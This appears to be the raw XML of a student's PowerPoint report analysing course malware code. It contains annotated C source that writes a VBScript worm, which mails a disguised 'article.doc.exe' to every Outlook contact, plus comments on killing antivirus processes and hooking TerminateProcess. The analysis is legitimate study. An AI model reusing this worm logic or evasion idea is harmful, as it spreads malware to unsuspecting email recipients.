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B4_8EA35F18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B6_9824DB19.xml" ContentType="application/vnd.ms-powerpoint.comments+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide8.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/comments/modernComment_1B7_24170127.xml" ContentType="application/vnd.ms-powerpoint.comments+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide9.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/comments/modernComment_1B8_802D12E2.xml" ContentType="application/vnd.ms-powerpoint.comments+xml"/>
  <Override PartName="/ppt/notesSlides/notesSlide10.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.notesSlide+xml"/>
  <Override PartName="/ppt/comments/modernComment_1B9_E44E6549.xml" ContentType="application/vnd.ms-powerpoint.comment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AC_B6E2BEF.xml" ContentType="application/vnd.ms-powerpoint.comment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comments/modernComment_1AE_AB818DE4.xml" ContentType="application/vnd.ms-powerpoint.comments+xml"/>
  <Override PartName="/ppt/ink/ink4.xml" ContentType="application/inkml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comments/modernComment_1AF_4C8253A8.xml" ContentType="application/vnd.ms-powerpoint.comment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423" r:id="rId2"/>
    <p:sldId id="424" r:id="rId3"/>
    <p:sldId id="435" r:id="rId4"/>
    <p:sldId id="433" r:id="rId5"/>
    <p:sldId id="436" r:id="rId6"/>
    <p:sldId id="437" r:id="rId7"/>
    <p:sldId id="438" r:id="rId8"/>
    <p:sldId id="439" r:id="rId9"/>
    <p:sldId id="440" r:id="rId10"/>
    <p:sldId id="441" r:id="rId11"/>
    <p:sldId id="425" r:id="rId12"/>
    <p:sldId id="428" r:id="rId13"/>
    <p:sldId id="430" r:id="rId14"/>
    <p:sldId id="431" r:id="rId15"/>
    <p:sldId id="427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AC_B6E2B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ABB683-FE96-4E98-BC14-2DB64B10E75B}" authorId="{E9CB068E-0DAD-188A-5234-4F0D95AC1878}" created="2023-12-11T02:57:40.943">
    <pc:sldMkLst xmlns:pc="http://schemas.microsoft.com/office/powerpoint/2013/main/command">
      <pc:docMk/>
      <pc:sldMk cId="191769583" sldId="428"/>
    </pc:sldMkLst>
    <p188:txBody>
      <a:bodyPr/>
      <a:lstStyle/>
      <a:p>
        <a:r>
          <a:rPr lang="zh-CN" altLang="en-US"/>
          <a:t>LoadLibrary等函数的传参方式有问题吧？没看懂它们的传参方式。x86的传参不是edx,ecx...吗？</a:t>
        </a:r>
      </a:p>
    </p188:txBody>
  </p188:cm>
</p188:cmLst>
</file>

<file path=ppt/comments/modernComment_1AE_AB818D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B70ECF-3B01-4B0A-9320-C1C4904DBC76}" authorId="{E9CB068E-0DAD-188A-5234-4F0D95AC1878}" created="2023-12-11T03:10:38.743">
    <pc:sldMkLst xmlns:pc="http://schemas.microsoft.com/office/powerpoint/2013/main/command">
      <pc:docMk/>
      <pc:sldMk cId="2877394404" sldId="430"/>
    </pc:sldMkLst>
    <p188:replyLst>
      <p188:reply id="{90A9F2CA-D07B-46FC-AFDD-ADCA4CA980C6}" authorId="{E9CB068E-0DAD-188A-5234-4F0D95AC1878}" created="2023-12-13T13:55:35.870">
        <p188:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>为什么要去这些文件里找收件人的信息？这一点没搞懂</a:t>
            </a:r>
          </a:p>
        </p188:txBody>
      </p188:reply>
    </p188:replyLst>
    <p188:txBody>
      <a:bodyPr/>
      <a:lstStyle/>
      <a:p>
        <a:r>
          <a:rPr lang="zh-CN" altLang="en-US"/>
          <a:t>为什么邮件接收者的信息会被存储到找到的这些文件里？</a:t>
        </a:r>
      </a:p>
    </p188:txBody>
  </p188:cm>
</p188:cmLst>
</file>

<file path=ppt/comments/modernComment_1AF_4C8253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79409F-4266-49E5-BFE6-2A26BE77D105}" authorId="{E9CB068E-0DAD-188A-5234-4F0D95AC1878}" created="2023-12-11T03:22:42.250">
    <pc:sldMkLst xmlns:pc="http://schemas.microsoft.com/office/powerpoint/2013/main/command">
      <pc:docMk/>
      <pc:sldMk cId="1283609512" sldId="431"/>
    </pc:sldMkLst>
    <p188:replyLst>
      <p188:reply id="{045B97BB-D0DD-4913-AC3B-1F9F6077FE12}" authorId="{E9CB068E-0DAD-188A-5234-4F0D95AC1878}" created="2023-12-13T12:22:32.281">
        <p188:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>I think I can develop a function that hooks the API "TerminateProcess" in order to protect the malware not to be killed. It is a way to make malware against the antivirus.</a:t>
            </a:r>
          </a:p>
        </p188:txBody>
      </p188:reply>
    </p188:replyLst>
    <p188:txBody>
      <a:bodyPr/>
      <a:lstStyle/>
      <a:p>
        <a:r>
          <a:rPr lang="zh-CN" altLang="en-US"/>
          <a:t>我感觉这个stopAV的这个函数好弱啊，虽然现在没有什么新的想法写一个更强的。
如果TerminateProcess这个API不管用了，权限不够关不掉这个virus就麻烦了，比如说低权限的程序无法操作高权限的程序</a:t>
        </a:r>
      </a:p>
    </p188:txBody>
  </p188:cm>
</p188:cmLst>
</file>

<file path=ppt/comments/modernComment_1B4_8EA35F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9A2B66-DAAF-4BFC-ACB0-647A57695718}" authorId="{E9CB068E-0DAD-188A-5234-4F0D95AC1878}" created="2023-12-13T12:53:43.498">
    <pc:sldMkLst xmlns:pc="http://schemas.microsoft.com/office/powerpoint/2013/main/command">
      <pc:docMk/>
      <pc:sldMk cId="2393071384" sldId="436"/>
    </pc:sldMkLst>
    <p188:txBody>
      <a:bodyPr/>
      <a:lstStyle/>
      <a:p>
        <a:r>
          <a:rPr lang="zh-CN" altLang="en-US"/>
          <a:t>对于把一个exe文件的相关信息写到registry里面还是WININIT.INI里面表示疑惑。</a:t>
        </a:r>
      </a:p>
    </p188:txBody>
  </p188:cm>
</p188:cmLst>
</file>

<file path=ppt/comments/modernComment_1B6_9824DB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C72041-90F6-49C8-B0A7-C170912C1B58}" authorId="{E9CB068E-0DAD-188A-5234-4F0D95AC1878}" created="2023-12-13T13:37:13.2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52552217" sldId="438"/>
      <ac:spMk id="3" creationId="{F6B249A5-2656-A2BE-1B29-1B714CA861AF}"/>
    </ac:deMkLst>
    <p188:txBody>
      <a:bodyPr/>
      <a:lstStyle/>
      <a:p>
        <a:r>
          <a:rPr lang="zh-CN" altLang="en-US"/>
          <a:t>我好像知道了，第一次的邮件是给victim联系人的。第二次是给发邮件给victim的人的回信。</a:t>
        </a:r>
      </a:p>
    </p188:txBody>
  </p188:cm>
</p188:cmLst>
</file>

<file path=ppt/comments/modernComment_1B7_241701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296827-F387-45BD-8FED-7504D24C4E80}" authorId="{E9CB068E-0DAD-188A-5234-4F0D95AC1878}" created="2023-12-13T13:41:24.4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05487399" sldId="439"/>
      <ac:spMk id="3" creationId="{E6800730-8686-6358-325E-B04249CC9F68}"/>
    </ac:deMkLst>
    <p188:txBody>
      <a:bodyPr/>
      <a:lstStyle/>
      <a:p>
        <a:r>
          <a:rPr lang="zh-CN" altLang="en-US"/>
          <a:t>偷邮件信息</a:t>
        </a:r>
      </a:p>
    </p188:txBody>
  </p188:cm>
</p188:cmLst>
</file>

<file path=ppt/comments/modernComment_1B8_802D1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35B23C-6923-4DDD-B9F0-CFC0562BEBCE}" authorId="{E9CB068E-0DAD-188A-5234-4F0D95AC1878}" created="2023-12-13T13:45:27.6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50437602" sldId="440"/>
      <ac:spMk id="3" creationId="{E98BE7AE-347A-DD09-D995-5E4111C3CBD4}"/>
    </ac:deMkLst>
    <p188:txBody>
      <a:bodyPr/>
      <a:lstStyle/>
      <a:p>
        <a:r>
          <a:rPr lang="zh-CN" altLang="en-US"/>
          <a:t>这个就是去可能存储收件人信息的地方去找收件人的信息，找到后放到char* mail这个里面。</a:t>
        </a:r>
      </a:p>
    </p188:txBody>
  </p188:cm>
</p188:cmLst>
</file>

<file path=ppt/comments/modernComment_1B9_E44E65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1007E9-0A82-4612-BF33-026CAE02E3D8}" authorId="{E9CB068E-0DAD-188A-5234-4F0D95AC1878}" created="2023-12-13T13:50:03.6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30342985" sldId="441"/>
      <ac:spMk id="4" creationId="{2C9A8430-5264-CB72-ACFF-9FA44BCFE52C}"/>
    </ac:deMkLst>
    <p188:replyLst>
      <p188:reply id="{CB3F5EEE-B0FA-4028-A7B0-D0FA22A2F9FA}" authorId="{E9CB068E-0DAD-188A-5234-4F0D95AC1878}" created="2023-12-13T13:50:23.474">
        <p188:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>这个太绕了，不知道咋表述in English</a:t>
            </a:r>
          </a:p>
        </p188:txBody>
      </p188:reply>
    </p188:replyLst>
    <p188:txBody>
      <a:bodyPr/>
      <a:lstStyle/>
      <a:p>
        <a:r>
          <a:rPr lang="zh-CN" altLang="en-US"/>
          <a:t>这是第三次send邮件了。我认为这三次send邮件的对象不一样。
第一次，给outlook中所有的联系人发邮件
第二次，给所有给victim 发过邮件的人回复邮件
第三次，给所有victim 已经发过邮件的人再发一次邮件。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3T12:45:24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316 645 24575,'0'0'0,"-1"0"0,1 0 0,-1 0 0,1 1 0,-1-1 0,1 0 0,-1 0 0,1 1 0,0-1 0,-1 0 0,1 1 0,-1-1 0,1 1 0,0-1 0,-1 0 0,1 1 0,0-1 0,0 1 0,-1-1 0,1 1 0,0-1 0,0 1 0,-1 0 0,-4 16 0,3-10 0,-79 231 0,-18 33 0,56-160 0,25-58 0,3 0 0,2 2 0,2-1 0,3 2 0,2-1 0,3 89 0,2-96 0,0-29 0,1 1 0,0 0 0,2-1 0,0 1 0,9 37 0,2-23 0,1 0 0,2-1 0,32 53 0,-1 0 0,-32-54 0,22 31 0,-27-50 0,0-1 0,1 0 0,16 14 0,6 5 0,20 20 0,15 16 0,-56-53 0,0-1 0,1 0 0,0 0 0,1-2 0,1 0 0,0 0 0,18 9 0,8 0 0,1-2 0,0-2 0,1-1 0,0-2 0,1-3 0,1-1 0,0-2 0,87 2 0,31-8 0,189 7 0,-270-3 0,109 10 0,250 22 0,-338-38 0,81 1 0,-95 7 0,24 2 0,421-8 0,-275-2 0,-234-1 0,-1-1 0,1-1 0,-1-1 0,37-12 0,9-2 0,130-21 0,336-24 0,-328 45 0,198-6 0,-400 25 0,457 0 0,-328-7 0,46-1 0,929 6 0,-566 3 0,-174 20 0,-263-12 0,-61-5 0,277 12 0,516-7 0,-805-8 0,399 25 0,-277-15 0,174-10 0,-316-1 0,598-49 0,-387 25 0,30 0 0,63 5 0,0 19 0,-141 2 0,417 21 0,-245 5 0,-72-6 0,-172-12 0,424 23 0,670-36-1603,-672 4-3731,-50 17 5302,-102-2 34,102-13 513,-158-6 5891,393-46-6360,-84-14-46,-322 47 0,238-5 0,-287 20 0,289-4 0,969-5-600,-1175 17 600,206 0 0,-378-12 0,209-34 0,-279 23 185,354-45 230,312 49-6345,-549 14 5076,-116-1 785,416-16 1269,-318-9 4534,263-44-5815,-328 46 410,251-33-7687,513-30 5908,-787 72 1443,139-30 7757,40-27-6945,55-9-874,-311 74 69,327-63 0,59-12 0,44-12 0,-234 18-6144,-8-16 4632,209-114 8758,-414 197-6836,-3 1-410,23-10 0,-2-1 0,0-2 0,55-43 0,-86 61 0,-1 0 0,0 0 0,1 0 0,-1 0 0,0-1 0,0 1 0,0 0 0,0-1 0,0 1 0,0-1 0,0 1 0,-1-1 0,1 0 0,-1 1 0,1-1 0,-1 0 0,1 1 0,-1-1 0,0 0 0,0 1 0,0-1 0,0 0 0,0 0 0,0 1 0,0-1 0,-1 0 0,1 1 0,-1-1 0,1 0 0,-1 1 0,1-1 0,-1 0 0,0 1 0,-2-3 0,-2-3 0,0 1 0,-1 0 0,0 0 0,0 0 0,-1 1 0,-6-5 0,-15-9 0,0 1 0,-2 1 0,-40-15 0,-97-30 0,-152-24 0,-6 24 0,220 43 0,-308-47 0,-2 32 0,319 32 0,-202-10 0,-91-12 0,-179-19 0,142-32 0,212 35 0,35 7 0,83 14 0,-525-92 0,0 14 0,-84 12 0,628 79 0,-503-25 0,155 31 0,391 2 0,0 2 0,-36 8 0,8-1 0,-564 77 0,303-69 0,145-12 0,-127 16 0,241-16 0,-43 2 0,-745-22 0,335 9 17,-69-2-252,-99-21-1030,419 12 1236,-131-3 1387,-627 17-1203,460 3-156,75-27 10,215 6-142,47 8-395,-922-42-2756,-212 45 2247,513 50 1067,703-32 174,-353 7 3391,-1-19-2318,150 0-1410,-622 2 133,690 9 0,29-1 0,-557-31-736,673 12 736,-272-29 0,-32-1 532,-56-8-328,72-9-204,-4 31 0,-921 28-4782,539 0 2567,574-1 2018,-256 1 1507,360 4 4110,-172 24-5194,284-27 12,-692 28-238,-180-31 0,850 3 0,0 2 0,-60 14 0,54-8 0,-62 4 0,72-12 0,10-1 0,-52 8 0,24-3 0,44-5 0,0 0 0,1 0 0,-1 1 0,0 1 0,-16 5 0,-56 21 0,61-22 0,0 0 0,1 2 0,0 0 0,-25 16 0,8-2 0,-31 21 0,61-38 0,1 1 0,0-1 0,1 2 0,0-1 0,-12 15 0,16-16 0,1 0 0,-1 0 0,1 0 0,1 0 0,-1 0 0,1 0 0,0 1 0,0-1 0,0 13 0,-3 19 0,0-17 0,2-8 0,0 1 0,-2-1 0,0 0 0,-7 17 0,-28 61 0,-20 40 0,59-130 3,0-1 0,-1 1 0,1-1 0,0 1 0,-1-1 1,1 1-1,0-1 0,-1 1 0,1-1 0,0 1 0,-1-1 0,1 1 0,-1-1 0,1 0 0,-1 1 0,1-1 0,-1 0 0,0 1 0,0-1-71,1-1 1,-1 1-1,1-1 0,-1 1 0,1 0 1,-1-1-1,1 1 0,-1-1 0,1 1 0,0-1 1,-1 1-1,1-1 0,0 0 0,0 1 1,-1-1-1,1 1 0,0-1 0,0 0 0,0 1 1,-1-2-1,-5-24-6758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3T12:45:59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24575,'2'0'0,"0"-1"0,0 1 0,0-1 0,1 0 0,-1 0 0,0 0 0,0 0 0,0 0 0,-1 0 0,4-2 0,6-5 0,65-28 0,1 4 0,1 3 0,83-19 0,-90 30 0,134-15 0,-200 33 0,-1 0 0,0 0 0,0 0 0,0 0 0,0 0 0,0 1 0,0 0 0,7 2 0,-9-2 0,1 0 0,-1 1 0,1-1 0,-1 1 0,0 0 0,1 0 0,-1-1 0,0 2 0,0-1 0,0 0 0,-1 0 0,4 5 0,7 14 0,-2 0 0,0 0 0,-1 1 0,-1 0 0,0 1 0,4 30 0,-7-22 0,-1-1 0,-1 1 0,-2 0 0,-3 42 0,1-64 0,-1-1 0,0 1 0,0-1 0,0 0 0,-1 0 0,-1 0 0,1 0 0,-1 0 0,-1-1 0,-7 11 0,-6 5 0,-38 35 0,32-33 0,16-18 0,-63 72 0,61-67 0,0 1 0,2 1 0,-1 0 0,-9 24 0,9-14 0,1 1 0,1-1 0,1 2 0,-4 39 0,6 105 0,8-142-1365,0-18-5461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3T12:45:5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1T03:09:38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24575,'545'0'0,"-528"-1"0,-1 0 0,20-5 0,-18 3 0,28-2 0,-16 3 0,0 0 0,0-2 0,0-1 0,0-1 0,36-13 0,-51 15 0,-1 1 0,1 0 0,0 1 0,25 0 0,-25 2 0,1-1 0,-1-1 0,0 0 0,21-6 0,-16 2 0,0 2 0,0 0 0,1 1 0,21 0 0,86 3 0,-50 2 0,-71-2 0,-1 0 0,0 0 0,0 0 0,0-1 0,0 0 0,0-1 0,-1 1 0,1-1 0,0 0 0,-1 0 0,11-6 0,-6 2-1365,0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1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248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29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465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50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656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349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84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25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956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331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5.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag15.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.png"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink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microsoft.com/office/2018/10/relationships/comments" Target="../comments/modernComment_1B4_8EA35F18.xml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10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink2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6_9824DB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7_2417012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8_802D12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9_E44E654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7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microsoft.com/office/2018/10/relationships/comments" Target="../comments/modernComment_1AC_B6E2BEF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4.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image9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microsoft.com/office/2018/10/relationships/comments" Target="../comments/modernComment_1AE_AB818DE4.xml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60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microsoft.com/office/2018/10/relationships/comments" Target="../comments/modernComment_1AF_4C8253A8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analysis of the code in quiz1 and quiz2.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week06.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Still doing quiz2 and I will finish it Thursday.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Finsi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the study of week06.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50578" y="1524635"/>
            <a:ext cx="5132705" cy="1904365"/>
            <a:chOff x="839" y="2401"/>
            <a:chExt cx="8083" cy="299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2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Next I will show you the malicious part I find in quiz1 code.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977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This part copies the malware to the file named “article.doc.exe”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Create a registry key, I think it is used for uninstalling the malware itself to avoid being detected.(Just guess)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A9CE0-7BDD-497A-1720-185CAC249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502" y="4112319"/>
            <a:ext cx="12192000" cy="240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9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656715"/>
            <a:chOff x="839" y="1816"/>
            <a:chExt cx="8083" cy="260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2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194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worm replicate itself.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am confused about the code in the red circle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registry ,each key has its own meaning?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4ADC6C-C8B7-C05E-56BF-036999336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691471"/>
            <a:ext cx="12192000" cy="38144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747CE6D-6B0B-0318-A16E-FFA5A7C99609}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="640304" y="4601015"/>
              <a:ext cx="11108160" cy="10285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747CE6D-6B0B-0318-A16E-FFA5A7C996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1664" y="4592015"/>
                <a:ext cx="11125800" cy="10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11E6358-D6A6-01FA-3D7F-AEE2925F43A3}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="8739944" y="5651855"/>
              <a:ext cx="310320" cy="420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11E6358-D6A6-01FA-3D7F-AEE2925F43A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31304" y="5643215"/>
                <a:ext cx="32796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6AFE9BD-E5DA-E2F0-5905-C1BAF75030F0}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="8953784" y="6281855"/>
              <a:ext cx="360" cy="3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6AFE9BD-E5DA-E2F0-5905-C1BAF75030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44784" y="627285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30713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C24460-13CC-81D5-8441-767C320176CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="73962" y="1077028"/>
            <a:ext cx="121920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en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>vbsworm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("wargames.vbs", "w");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"On Error Resume Next\n");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msgbox</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> %</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>cScripting.FileSystemObject%c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\n", 34, 34);//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>msgbox</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Scripting.FileSystemObject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"Set sf=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>CreateObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>cScripting.FileSystemObject%c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>)\n", 34, 34);//("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Scripting.FileSystemObject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"Set sys=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>sf.GetSpecialFolder</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(1)\n");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fprintf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vbsworm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, "Set OA=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CreateObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cOutlook.Application%c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)\n", 34, 34);//get the information stored in Outlook.exe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fprintf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vbsworm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, "Set MA=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>OA.GetNameSpace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cMAPI%c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)\n", 34, 34);//get the mail in the Outlook.exe?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"For Each C In </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>MA.AddressLists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>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"If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>C.AddressEntries.Count</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> &lt;&gt; 0 Then\n");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"For D=1 To </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>C.AddressEntries.Count</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>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"Set AD=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>C.AddressEntries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(D)\n");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"Set EM=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>OA.CreateItem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(0)\n");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EM.To</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>AD.Address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>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EM.Subject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>=%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>cHi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> %</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>c&amp;AD.Name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>&amp;%c read </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>this.%c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\n", 34, 34, 34, 34);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"body=%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>cI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> found this on the web and it is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>important.%c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\n", 34, 34);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"body = body &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>VbCrLf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> &amp; %</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>cOpen</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> the attached file and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>read.%c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\n", 34, 34);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EM.Body</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>=body\n");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fprintf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vbsworm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EM.Attachments.Add</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(sys&amp;%c\\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>article.doc.exe%c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)\n", 34, 34);//the attachment of the mail is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>malcious</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>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EM.DeleteAfterSubmit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>=True\n");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"If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>EM.To</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> &lt;&gt; %</a:t>
            </a:r>
            <a:r>
